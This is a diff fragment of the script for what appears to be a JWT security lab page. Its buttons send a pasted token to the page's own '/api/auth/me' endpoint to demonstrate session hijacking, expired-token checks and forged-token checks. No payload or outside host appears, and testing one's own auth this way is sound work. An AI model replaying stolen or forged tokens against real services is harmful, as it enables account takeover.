+    } catch(e) {
+      el.innerHTML += `<div style="color:#f85149;font-size:12px;margin-top:4px;">⚠️ Error: ${e.message}</div>`;
+    }
+    await new Promise(r => setTimeout(r, 100));
+  }
+}
+
+function showHijackDemo() {
+  const el = document.getElementById('hijack-resp');
+  if (!currentToken) {
+    el.innerHTML = '<div class="resp-header"><span class="status">⚠️ Chưa có token. Login trước hoặc dán token vào ô JWT Token.</span></div>';
+    return;
+  }
+  apiCall('GET', '/api/auth/me', null, 'hijack-resp', true);
+}
+
+async function testExpiredToken() {
+  const token = document.getElementById('exp-token').value.trim();
+  if (!token) { alert('Dán token cũ vào ô trên'); return; }
+  const start = Date.now();
+  try {
+    const res = await fetch(BASE + '/api/auth/me', {
+      headers: { 'Authorization': 'Bearer ' + token }
+    });
+    const data = await res.json();
+    showResp('exp-resp', res.status, data, Date.now() - start);
+  } catch(e) {
+    showResp('exp-resp', 0, 'Error: ' + e.message, Date.now() - start);
+  }
+}
+
+async function testForgedToken() {
+  const token = document.getElementById('forgery-jwt').value.trim();
+  if (!token) { alert('Paste JWT token vào ô trên'); return; }
+  const start = Date.now();
+  try {
+    const res = await fetch(BASE + '/api/auth/me', {
+      headers: { 'Authorization': 'Bearer ' + token }
+    });
+    const data = await res.json();
+    showResp('forgery-resp', res.status, data, Date.now() - start);
+  } catch(e) {
+    showResp('forgery-resp', 0, 'Error: ' + e.message, Date.now() - start);
+  }
+}
+
+// Sidebar navigation
+document.querySelectorAll('.chapter').forEach(el => {
+  el.addEventListener('click', function() {
+    document.querySelectorAll('.chapter').forEach(c => c.classList.remove('active'));
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById('section-' + this.dataset.section).classList.add('active');
+  });
+});
+
+// Keyboard shortcut: Ctrl+Enter on inputs to trigger parent button
+document.querySelectorAll('.params-area input, .params-area select, .params-area textarea').forEach(el => {
+  el.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+      const card = this.closest('.card');
+      if (card) {
+        const btn = card.querySelector('.btn.primary, .btn.danger, .btn.warning');
+        if (btn) btn.click();
+      }
+    }
+  });
+});
+</script>
+</body>
+</html>
